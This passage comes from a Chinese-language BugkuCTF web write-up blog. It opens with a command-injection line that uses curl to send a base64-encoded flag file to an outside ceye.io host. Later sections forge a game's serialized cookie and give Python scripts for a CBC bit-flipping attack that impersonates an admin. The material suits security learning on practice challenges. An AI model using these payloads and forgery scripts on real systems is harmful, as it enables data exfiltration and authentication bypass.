<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;curl 288vqv.ceye.io/`cat ./fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt|base64`</span><br></pre></td></tr></table></figure>
<p>得到</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118103120129.png" alt="在这里插入图片描述"><br>解码得到flag，或者直接访问<code>fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt</code>也行。</p>
<br>

<h1 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h1><p>进入页面后，发现需要花费money来修炼，但是我们并没有足够的钱。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118154932420.png" alt="在这里插入图片描述"></p>
<p>观察到url中有<code>/wulin.php?action=map</code>，尝试文件包含，会跳转到<code>?action=500</code>，如下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118155154389.png" alt="在这里插入图片描述"><br>查看源代码，发现三个js文件：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118155231225.png" alt="在这里插入图片描述"><br>先看一下<code>script.js</code>，用<code>eval()</code>执行了一个函数，我们改成<code>console.log()</code>放控制台运行一下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118155421767.png" alt="在这里插入图片描述"></p>
<p>格式化后如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">cname</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i].<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">if</span> (c.<span class="title function_">indexOf</span>(name) == <span class="number">0</span>) <span class="keyword">return</span> c.<span class="title function_">substring</span>(name.<span class="property">length</span>, c.<span class="property">length</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decode_create</span>(<span class="params">temp</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> <span class="title class_">Base64</span>();</span><br><span class="line">    <span class="keyword">var</span> result = base.<span class="title function_">decode</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = result[i].<span class="title function_">charCodeAt</span>();</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        result3 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ertqwe</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> temp_name = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="title function_">getCookie</span>(temp_name);</span><br><span class="line">    temp = <span class="built_in">decodeURIComponent</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> mingwen = <span class="title function_">decode_create</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> ca = mingwen.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ca.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (-<span class="number">1</span> &lt; ca[i].<span class="title function_">indexOf</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            key = ca[i + <span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    key = key.<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-2.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-3.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-4.jpg&quot;</span></span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/6.png&quot;</span></span><br><span class="line">    &#125;, <span class="number">4000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + <span class="title function_">md5</span>(key) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    &#125;, <span class="number">5000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来是在cookie上动手脚了，先看一下cookie是什么：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118160341723.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:629;s:5:&quot;neili&quot;;i:845;s:5:&quot;lidao&quot;;i:93;s:6:&quot;dingli&quot;;i:73;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:0;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>是php序列化串，并且可以看到moeny属性为0，所以这一题的思路应该就是修改序列化里的money的值到足够大，然后再逆向加密回cookie，从而获得足够的钱。</p>
<p>根据上面的<code>decode_create</code>函数写出对应的加密函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encode_create</span>(<span class="params">temp</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = temp.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">        num = num + ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> <span class="title class_">Base64</span>();</span><br><span class="line">    <span class="keyword">var</span> result2 = base.<span class="title function_">encode</span>(result);</span><br><span class="line">    <span class="keyword">return</span> result2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还有一个比较坑的点，他给的base64的加密和解密函数不是完全对应的：在加密时使用了<code>_utf8_encode(input)</code>，而在解密时却把<code>_utf8_decode(output)</code>注释掉了，所以我们加密时也需要把这个注释掉，然后可以在控制台直接覆盖掉原来的函数。</p>
<p>这样就可以来伪造cookie了：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118161812753.png" alt="在这里插入图片描述"><br>修改cookie并刷新，可以发现我们已经有足够的钱了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118162029257.png" alt="在这里插入图片描述"><br>然后按要求练功即可得到flag：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191118162101955.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h1><p>扫描目录得到文件泄露：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191204092536636.png" alt="在这里插入图片描述"><br>用vim恢复.swp文件得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/root/key&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is $flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ...html code...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行代码审计，可以看到要想获得flag需要以admin的身份登陆，但是又禁止了直接用admin登录，但是是通过获取cookie中的值来判断是否为admin，所以就需要利用cookie伪造登录。</p>
<p>这里把登录的用户名及其密码存入数组，序列化后进行AES-CBC模式的加密，其中iv和cipher以cookie储存，可以控制，导致存在攻击的可能，即利用CBC字节翻转攻击。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191204095106678.png" alt="在这里插入图片描述"><br>在CBC模式下，加密过程中前一块的密文会用来产生后一块的密文，解密过程中前一块的密文会用来产生下一块明文。</p>
<p>这样如上图所示，如果我们改变前一块密文的一个字节，当它被用来与下一块密文解密后的值进行异或时，就会影响原来的那一个字节，从而修改了解密后明文的一个字节。</p>
<p>在这一题中，我们可以先注册一个用户名为Admin的用户，得到如下序列化串:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;Lethe&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>然后进行分组，根据iv可知16字节为一组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;Admin&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:5:&quot;Lethe&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>我们要做的就是利用CBC字节翻转攻击将这里的A修改为a，即第二块偏移量为9的位置，对应的我们需要修改第一块相同偏移位置的值，从而使异或后的值为A。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = unquote(<span class="string">&#x27;5xk%2Fxj9S6VwrA1440izsIdOT5JkK%2FyyM4%2BVy8dHSegZO6I5jBESTxFltBW9d7qxSacEzFhXDKvo7qSG85dzAPQ%3D%3D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = b64decode(cipher).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = cipher[:<span class="number">9</span>] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[<span class="number">9</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + cipher[<span class="number">10</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(b64encode(cipher.encode(<span class="string">&#x27;latin-1&#x27;</span>)).decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将得到的值url编码一些修改为cipher的值得到：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191204104650473.png" alt="在这里插入图片描述"><br>这里还有一个问题，我们为了修改A，修改了第一块分组，这样反序列化就会失败，因此我们必须还得保证第一块分组不变，这可以通过修改iv来实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 新页面得到的iv</span></span><br><span class="line">iv = unquote(<span class="string">&#x27;pW4LieJ5j8bVoEFMORTYPA%3D%3D&#x27;</span>)</span><br><span class="line"><span class="comment"># 回显的plain值</span></span><br><span class="line">plain = <span class="string">&#x27;VxqqyZUYQyfs7WUL/CM2TW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IkxldGhlIjt9&#x27;</span></span><br><span class="line"></span><br><span class="line">plain = b64decode(plain).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">iv = b64decode(iv).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">right = <span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span></span><br><span class="line"></span><br><span class="line">newiv = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    newiv += <span class="built_in">chr</span>(<span class="built_in">ord</span>(right[i]) ^ <span class="built_in">ord</span>(iv[i]) ^ <span class="built_in">ord</span>(plain[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(b64encode(newiv.encode(<span class="string">&#x27;latin-1&#x27;</span>)).decode()))</span><br></pre></td></tr></table></figure>

<p>将得到的值修改为iv，刷新页面得到flag：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20191204111714822.png" alt="在这里插入图片描述"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethesec.github.io/blog/2019/0307/BugkuCTF-Writeup-Web/">https://lethesec.github.io/blog/2019/0307/BugkuCTF-Writeup-Web/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/blog/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/blog/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/blog/2019/0521/ADWorld-Writeup/">攻防世界Web</a>
            
            
            <a class="next" rel="next" href="/blog/2019/0303/CumtCTF2019-Web-Writeup/">CumtCTF2019Ⅱ——Writeup（Web详解）</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>